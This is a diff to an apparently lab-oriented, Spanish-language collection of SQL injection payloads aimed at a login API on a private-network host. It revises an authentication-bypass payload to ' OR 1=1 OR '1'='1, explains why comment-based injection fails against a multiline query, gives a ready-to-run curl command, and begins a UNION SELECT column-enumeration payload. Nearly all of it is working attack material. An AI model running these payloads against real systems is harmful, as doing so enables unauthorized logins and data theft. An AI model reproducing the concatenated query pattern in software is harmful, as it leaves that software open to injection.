@@ -13,20 +13,21 @@ Query vulnerable en servidor:
   WHERE username = '<INPUT>'
   AND   password = '<MD5_INPUT>'
 
-PAYLOAD 1 — Bypass de autenticación (OR clásico):
-  username = ' OR '1'='1'--
+PAYLOAD 1 — Bypass de autenticación (OR lógico para consultas multilinea):
+  username = ' OR 1=1 OR '1'='1
   password = (cualquier valor)
 
-  Query resultante:
-    SELECT ... WHERE username = '' OR '1'='1'--' AND password = '...'
-  Efecto: La cláusula '1'='1' es SIEMPRE verdadera.
-          El comentario -- elimina la verificación de contraseña.
-  Resultado: Login como el primer usuario de la tabla.
+  Query resultante (multilinea):
+    SELECT ... WHERE username = '' OR 1=1 OR '1'='1'
+    AND password = '...'
+  Efecto: El servidor usa un template literal multilínea, por lo que el comentario '--' fallaría.
+          Usando lógica pura, '1=1' hace verdadera toda la cláusula.
+  Resultado: Login exitoso como el primer usuario de la tabla (admin).
 
   Ejemplo (curl):
   curl -X POST http://192.168.56.20:4000/api/login \
        -H "Content-Type: application/json" \
-       -d '{"username": "'' OR ''1''=''1''--", "password": "x"}'
+       -d '{"username": "'' OR 1=1 OR ''1''=''1", "password": "x"}'
 
 PAYLOAD 2 — UNION SELECT para enumerar columnas:
   username = ' UNION SELECT 1,2,3,4,5--
